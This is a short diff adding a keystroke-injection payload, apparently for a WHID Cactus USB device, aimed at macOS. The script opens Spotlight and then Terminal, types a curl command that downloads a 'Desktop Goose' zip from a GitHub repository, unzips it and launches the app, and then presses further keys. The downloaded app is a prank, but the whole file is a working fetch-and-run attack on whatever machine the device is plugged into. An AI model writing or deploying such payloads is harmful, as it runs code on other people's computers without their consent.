@@ -1,0 +1,11 @@
+Press:131+32
+PrintLine:Terminal
+PrintLine:curl -L "https://github.com/Starke427/WHID_Cactus/raw/master/Desktop%20Goose%20for%20Mac%20v0.22.zip" -o DesktopGoose.zip; unzip DesktopGoose.zip; open -a "Desktop Goose";
+Delay
+Delay
+Delay
+Delay
+Delay
+Delay
+Press:131+113
+Press:176
